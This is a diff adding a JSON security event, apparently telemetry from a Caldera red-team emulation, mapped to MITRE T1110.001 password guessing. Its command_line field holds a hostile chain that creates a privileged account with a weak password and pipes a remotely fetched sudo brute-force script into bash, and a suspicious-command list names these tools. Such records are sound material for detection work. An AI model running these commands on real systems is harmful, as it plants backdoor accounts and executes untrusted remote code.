@@ -1,0 +1,123 @@
+[
+    {
+        "event": {
+            "id": "0fba8469-dd65-48fb-9936-0f3767a5c918",
+            "timestamp": "2026-07-12T05:10:53Z",
+            "type": [
+                "endpoint",
+                "process"
+            ],
+            "activity": [
+                "credential_bruteforce",
+                "account_creation",
+                "file_download",
+                "script_execution"
+            ],
+            "category": [
+                "host",
+                "process"
+            ],
+            "enrichment_sources": [
+                "mitreTTP",
+                "assetDB",
+                "geoIP"
+            ],
+            "source": "caldera"
+        },
+        "network": {
+            "protocol": "",
+            "transport": "",
+            "direction": "",
+            "packets": 0,
+            "bytes": 0
+        },
+        "source": {
+            "ip": "192.168.2.36",
+            "port": 0,
+            "address": "",
+            "geo_ip": {
+                "country_iso_code": "IND",
+                "country_name": "India",
+                "state": "Delhi",
+                "city": "Delhi",
+                "is_private": true,
+                "longitude": 28.6687,
+                "latitude": 77.2304,
+                "timezone": "IST"
+            },
+            "asset": {
+                "asset_type": "workstation",
+                "criticality": "high",
+                "owner": "",
+                "hostname": "mac",
+                "os": "mac",
+                "location": "",
+                "is_external": false
+            }
+        },
+        "destination": {
+            "ip": "10.0.2.15",
+            "port": 0,
+            "address": "",
+            "geo_ip": {
+                "country_iso_code": "IND",
+                "country_name": "India",
+                "state": "Delhi",
+                "city": "Delhi",
+                "is_private": true,
+                "longitude": 28.6687,
+                "latitude": 77.2304,
+                "timezone": "IST"
+            },
+            "asset": {
+                "asset_type": "workstation",
+                "criticality": "high",
+                "owner": "",
+                "hostname": "ubuntu-vb",
+                "os": "linux",
+                "location": "",
+                "is_external": false
+            }
+        },
+        "host": {
+            "user": "ubuntu",
+            "hostname": "ubuntu-vb",
+            "group": "red",
+            "platform": "linux",
+            "architecture": "amd64"
+        },
+        "process": {
+            "pid": 2451,
+            "ppid": 0,
+            "name": "useradd",
+            "command_line": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash",
+            "executor": "sh",
+            "user": "ubuntu",
+            "host": "ubuntu-vb",
+            "exit_code": -1,
+            "status": "success"
+        },
+        "suspicious": {
+            "commands": [
+                "curl",
+                "useradd",
+                "sudo_bruteforce",
+                "bash"
+            ],
+            "processes": [
+                "curl",
+                "bash"
+            ]
+        },
+        "mitre": [
+            {
+                "tactic_id": "",
+                "tactic_name": "credential-access",
+                "technique_id": "T1110",
+                "technique_name": "Brute Force",
+                "sub_technique_id": "T1110.001",
+                "sub_technique_name": "Brute Force: Password Guessing"
+            }
+        ]
+    }
+]
